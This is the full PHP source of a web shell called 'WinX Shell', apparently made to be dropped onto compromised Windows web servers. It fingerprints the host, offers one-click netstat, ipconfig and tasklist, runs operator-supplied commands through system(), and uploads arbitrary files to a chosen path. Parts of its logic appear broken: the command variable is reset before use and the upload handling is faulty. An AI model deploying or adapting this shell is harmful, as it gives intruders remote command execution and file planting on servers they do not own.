<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>
<body bgcolor="#FFFFFF" text="#000000" link="#0066FF" vlink="#0066FF" alink="#0066FF">
<?php

// -----:[ Start infomation ]:-----
// It's simple shell for all Win OS.
// Created by greenwood from n57
//
// ------:[ End infomation]:-------

// set_magic_quotes_runtime(0);
//*Variables*

//-------------------------------

$veros = `ver`;
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$windir = `echo %windir%`;
$cmd = '';
$PHP_SELF = $_SERVER['PHP_SELF'];

//------------------------------
   if ('' == $cmd) {
       $cmd = 'dir /OG /X';
   }
//-------------------------------

//------------------------------

echo '<table  style="font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 9px; border: 1px #000000 dotted"  border="0" cellspacing="1" cellpadding="2"  >';
echo    '<tr>';
echo      '<td><font color="#990000">You:</font></td>';
echo      '<td> ' . $_SERVER['REMOTE_ADDR'] . ' [<font color="#0033CC">' . $host . '</font>] </td>';
echo    '</tr>';
echo    '<tr>';
echo      '<td><font color="red">Version OS:</font></td>';
echo      "<td><font color=\"#0066CC\"> $veros </font></td>";
echo    '</tr>';
echo    '<tr>';
echo     '<td><font color="#990000">Server:</font></td>';
echo      '<td><font color="#0066CC">' . $_SERVER['SERVER_SIGNATURE'] . '</font></td>';
echo    '</tr>';
echo    '<tr>';
echo     '<td><font color="#990000">Win Dir:</font></td>';
echo      "<td><font color=\"#0066CC\"> $windir </font></td>";
echo    '</tr>';
echo  '</table>';
echo  '<br>';

//------- [netstat -an] and [ipconfig] and [tasklist] ------------
echo "<form name=\"cmd_send\" method=\"post\" action=\"$PHP_SELF\">";
echo '<input style="font-family: Verdana; font-size: 12px; width:10%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px" type="submit" name="cmd" value="netstat -an">';
echo '&nbsp;&nbsp;&nbsp;';
echo '<input style="font-family: Verdana; font-size: 12px; width:10%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px" type="submit" name="cmd" value="ipconfig">';
echo '&nbsp;&nbsp;&nbsp;';
echo '<input style="font-family: Verdana; font-size: 12px; width:10%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px" type="submit" name="cmd" value="tasklist">';
echo '</form>';
//-------------------------------

//-------------------------------

echo '<textarea style="width:100%; height:50% ;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px" readonly>';
       system($cmd);
echo '</textarea>';
echo '<br>';

//-------------------------------

echo "<form name=\"cmd_send\" method=\"post\" action=\"$PHP_SELF\">";
echo '<font face="Verdana" size="1" color="#990000">CMD: </font>';
echo '<br>';
echo "<input style=\"font-family: Verdana; font-size: 12px; width:50%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"text\" name=\"cmd\" value=\"$cmd\">";
echo ' <input style = "font-family: Verdana; font-size: 12px; background-color: #FFFFFF; border: #666666; border-style: solid; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px" type="submit" name="_run" value="Run">';
echo '</form>';

//-------------------------------

echo "<form  enctype=\"multipart/form-data\" action=\"$PHP_SELF\" method=\"post\">";
echo '<font face="Verdana" size="1" color="#990000">Upload:</font>';
echo '<br>';
echo '<input type="hidden" name="MAX_FILE_SIZE" value="100000">';
echo '<font face="Verdana" size="1" color="#990000">File: </font><input style="font-family: Verdana; font-size: 9px; background-color: #FFFFFF; border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px" name="userfile" type="file">';
echo ' <font face="Verdana" size="1" color="#990000">Filename on server: </font> <input style="font-family: Verdana; font-size: 9px;background-color: #FFFFFF; border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px" name="serverfile" type="text">';
echo' <input style ="font-family: Verdana; font-size: 9px; background-color: #FFFFFF; border: #666666; border-style: solid; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px" type="submit" value="Send">';
echo'</form>';

?>


<?php
$userfile = $_FILES['userfile'];

// Script for uploading
 if (is_uploaded_file($userfile)) {
     move_uploaded_file($userfile, $serverfile);
 }

?>


<center><font face="Verdana" size="1" color="#000000">Created by -:[GreenwooD]:- </font></center>
</body></html>